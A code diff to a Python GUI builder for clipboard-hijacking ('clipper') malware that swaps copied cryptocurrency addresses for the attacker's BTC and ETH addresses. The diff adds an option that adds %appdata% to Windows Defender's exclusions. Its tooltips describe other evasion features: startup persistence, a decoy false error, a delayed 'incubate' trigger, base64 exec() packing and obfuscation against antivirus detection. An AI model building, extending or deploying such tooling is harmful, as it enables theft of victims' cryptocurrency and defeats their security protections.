@@ -224,6 +224,10 @@ class build:
             false_error = True
         else:
             false_error = False
+        if exclude_av_checkbox.get() == "on":
+            exclude_av = True
+        else:
+            exclude_av = False
 
         script_content = script_content.replace('btcaddr = "SET BTC ADDRESS HERE"', f"btcaddr = '{btc_addr}'")
         script_content = script_content.replace('ethaddr = "SET ETH ADDRESS HERE"', f"ethaddr = '{eth_addr}'")
@@ -240,6 +244,7 @@ class build:
         script_content = script_content.replace('ping = False', f'ping = {ping}')
         script_content = script_content.replace('incubate = False', f'incubate = {incubate}')
         script_content = script_content.replace('false_error = False', f'false_error = {false_error}')
+        script_content = script_content.replace('exclude_av = False', f'exclude_av = {exclude_av}')
 
         temp_ignore_lst = []
 
@@ -312,7 +317,7 @@ class build:
                 
             with open(os.path.join("output", new_file_name), "w") as file:
                 encoded_content = base64.b64encode(script_content_without_imports.encode()).decode()
-                file.write(f"#uses base64 - to decrypt search base64 decoder\n\n{import_lines}\nimport base64\n\nexec(base64.b64decode('{encoded_content}').decode())")
+                file.write(f"#uses base64 - to decrypt search base64 decoder\n\n{import_lines}\n\nexec(base64.b64decode('{encoded_content}').decode())")
 
         if obfuscate == "on":
             current_path = os.path.join("output", new_file_name)
@@ -550,22 +555,24 @@ class buildgui:
         config_set_lbl = customtkinter.CTkLabel(master=config_scroll_frame, text="config not set", text_color="red")
         config_set_lbl.pack()
         single_use_checkbox = customtkinter.CTkCheckBox(master=config_scroll_frame, text="single use", onvalue="on", offvalue="off")
-        single_use_checkbox.pack(pady=0, anchor="w", padx=(12, 0))
+        single_use_checkbox.pack(pady=0, anchor="w", padx=(0, 0))
         ping_discord_checkbox = customtkinter.CTkCheckBox(master=config_scroll_frame, text="@everyone discord", onvalue="on", offvalue="off")
-        ping_discord_checkbox.pack(pady=5, anchor="w", padx=(12, 0))
+        ping_discord_checkbox.pack(pady=5, anchor="w", padx=(0, 0))
         obfuscate_checkbox = customtkinter.CTkCheckBox(master=config_scroll_frame, text="obfuscated .exe", onvalue="on", offvalue="off")
-        obfuscate_checkbox.pack(pady=0, anchor="w", padx=(12, 0))
+        obfuscate_checkbox.pack(pady=0, anchor="w", padx=(0, 0))
         exe_file_checkbox = customtkinter.CTkCheckBox(master=config_scroll_frame, text="normal .exe file", onvalue="on", offvalue="off")
-        exe_file_checkbox.pack(pady=5, anchor="w", padx=(12, 0))
+        exe_file_checkbox.pack(pady=5, anchor="w", padx=(0, 0))
 
         """going to just use global here on"""
-        global incubate_checkbox, false_error_checkbox, encrypt_base64_checkbox
+        global incubate_checkbox, false_error_checkbox, encrypt_base64_checkbox, exclude_av_checkbox
         incubate_checkbox = customtkinter.CTkCheckBox(master=config_scroll_frame, text="incubate (4 restarts)", onvalue="on", offvalue="off")
-        incubate_checkbox.pack(pady=0, anchor="w", padx=(12, 0))
+        incubate_checkbox.pack(pady=0, anchor="w", padx=(0, 0))
         false_error_checkbox = customtkinter.CTkCheckBox(master=config_scroll_frame, text="false error", onvalue="on", offvalue="off")
-        false_error_checkbox.pack(pady=5, anchor="w", padx=(12, 0))
+        false_error_checkbox.pack(pady=5, anchor="w", padx=(0, 0))
         encrypt_base64_checkbox = customtkinter.CTkCheckBox(master=config_scroll_frame, text="encrypt base64", onvalue="on", offvalue="off")
-        encrypt_base64_checkbox.pack(pady=0, anchor="w", padx=(12, 0))
+        encrypt_base64_checkbox.pack(pady=0, anchor="w", padx=(0, 0))
+        exclude_av_checkbox = customtkinter.CTkCheckBox(master=config_scroll_frame, text="exclude windows av", onvalue="on", offvalue="off")
+        exclude_av_checkbox.pack(pady=5, anchor="w", padx=(0, 0))
 
         CTkToolTip.CTkToolTip(widget=single_use_checkbox, message="single use: code will run at startup until it detects a address to replace, when this happens the code will never run again - essentially only ever clipping once", wraplength=300)
         CTkToolTip.CTkToolTip(widget=obfuscate_checkbox, message="obfuscate: will run obfucscation and make .exe to make it more difficult to read and more difficult for anti virus detections", wraplength=300)
@@ -580,6 +587,7 @@ class buildgui:
         CTkToolTip.CTkToolTip(widget=incubate_checkbox, message="incubate: if enabled the code will not run until the computer is restarted 4 times, increases stealth, IF INCUBATE IS ENABLED FALSE ERROR WILL NEVER COME UP", wraplength=300)
         CTkToolTip.CTkToolTip(widget=false_error_checkbox, message="false error: if enabled the code will throw a false error to make it look like the code has crashed when it really is just a decoy (wont be installed in the peristant file). IF INCUBATE IS ENABLED FALSE ERROR WILL NEVER COME UP", wraplength=300)
         CTkToolTip.CTkToolTip(widget=encrypt_base64_checkbox, message="encrypt base64: if enabled the malware src code will be encrypted with base64 and executed with exec(). This works with both normal exe or obfuscated exe", wraplength=300)
+        CTkToolTip.CTkToolTip(widget=exclude_av_checkbox, message="exclude windows av: if enabled the code will attempt to exclude %appdata% path from windows defender antivirus. THIS REQUIRES THE EXE TO BE RUN AS ADMIN. Even if antivirus picks up on the malware at run it can still set the exclusion and make the persistent file (meaning even if the antivirus detects when ran the startup file will still run as its been set within an exclude folder)", wraplength=300)
 
     def main():
         global option_frame, main_frame, root
@@ -602,7 +610,7 @@ class buildgui:
         option_frame = customtkinter.CTkFrame(master=tabview.tab("builder"), fg_color="#242424")
         option_frame.pack(side="left", fill="y")
         main_frame = customtkinter.CTkFrame(master=tabview.tab("builder"), fg_color="#242424")
-        main_frame.pack(fill="both", expand=True, side="right", anchor="n", padx=(5, 0))
+        main_frame.pack(fill="both", expand=True, side="right", anchor="n", padx=(0, 0))
 
         docs = customtkinter.CTkScrollableFrame(master=tabview.tab("documentation"), fg_color="#242424")
         docs.pack(fill="both", expand=True)
@@ -635,7 +643,7 @@ In the ignore.txt file you can add computer names to ignore. The malware will no
 
 My icons arent showing on the .exe, why is this?
 Honestly im not sure why this happens - you can press the fix icons button which will restart windows explorer to update icons - if this doesnt work create an issue on github and try delete IconCashe.db in %localappdata% and restarting computer.""", justify="left", wraplength=750).pack(anchor="w")
-        customtkinter.CTkButton(master=tabview.tab("documentation"), text="https://github.com/3022-2", command=lambda: webbrowser.open_new_tab("https://github.com/3022-2")).pack(fill="x", pady=(5, 0))
+        customtkinter.CTkButton(master=tabview.tab("documentation"), text="https://github.com/3022-2", command=lambda: webbrowser.open_new_tab("https://github.com/3022-2")).pack(fill="x", pady=(0, 0))
 
         buildgui.build_widgets()
         if "dont_show_again.txt" not in os.listdir(cwd):
